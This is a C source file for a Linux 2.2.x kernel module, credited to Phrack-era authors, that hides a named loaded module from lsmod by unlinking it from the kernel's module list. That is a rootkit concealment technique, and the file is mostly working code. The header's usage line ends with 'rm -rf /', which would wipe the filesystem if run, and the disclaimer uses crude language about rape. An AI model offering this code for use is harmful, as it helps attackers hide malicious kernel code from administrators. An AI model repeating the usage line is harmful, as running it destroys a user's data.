/*
 * generic module hidder, for 2.2.x kernels.
 *
 * by kossak (kossak@hackers-pt.org || http://www.hackers-pt.org/kossak)
 * Enhanced by cyberwinds@hotmail.com
 *
 * This module hides the last module installed. With little mind work you can
 * put it to selectivly hide any module from the list.
 *
 * insmod'ing this module will allways return an error, something like device
 * or resource busy, or whatever, meaning the module will not stay installed.
 * Run lsmod and see if it done any good. If not, see below, and try until you 
 * suceed. If you dont, then the machine has a weird compiler that I never seen.
 * It will suceed on 99% of all intel boxes running 2.2.x kernels.
 * 
 * The module is expected not to crash when it gets the wrong register, but
 * then again, it could set fire to your machine, who knows...
 *
 * Idea shamelessly stolen from plaguez's itf, as seen on Phrack 52. 
 * The thing about this on 2.2.x is that kernel module symbol information is 
 * also referenced by this pointer, so this hides all of the stuff :)
 *
 * DISCLAIMER: If you use this for the wrong purposes, your skin will fall off,
 *             you'll only have sex with ugly women, and you'll be raped in
 *             jail by homicidal maniacs.
 *
 * Anyway, enjoy :)
 *
 * USAGE: gcc -c modhide.c ; insmod modhide.o ; lsmod ; rm -rf /
 */


#define MODULE
#define __KERNEL__

#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/string.h>
#include <linux/kernel.h>

char * modname;

MODULE_PARM(modname, "s");

int init_module(void) {

/*
 *  if at first you dont suceed, try:
 *  %eax, %ebx, %ecx, %edx, %edi, %esi, %ebp, %esp 
 *  I cant make this automaticly, because I'll fuck up the registers If I do 
 *  any calculus here.
 */
  register struct module *mp asm("%ebx");
  struct module *p;

  // check modname
  if(modname == 0x0){
    // If you really want to use this module, do it right way! thinkhard
    printk("Unknown module name. Try insmod modhide.o modname.\n");
    return -1;
  }

  
  /*
    if (mp->init == &init_module) // is it the right register? 
    if (mp->next) // and is there any module besides this one? 
    mp->next = mp->next->next; // cool, lets hide it :) 
  */

  if (mp->init == &init_module) /* is it the right register? */
    if (mp->next){ /* and is there any module besides this one? */
      p = mp->next;
      while(p && strcmp(p->name, modname)){
	mp = p;
	p=p->next;
      } 
      if(p) //found matching module
	mp->next = p->next;
    }
 
  return -1; /* the end. simple heh? */
}
/* EOF */
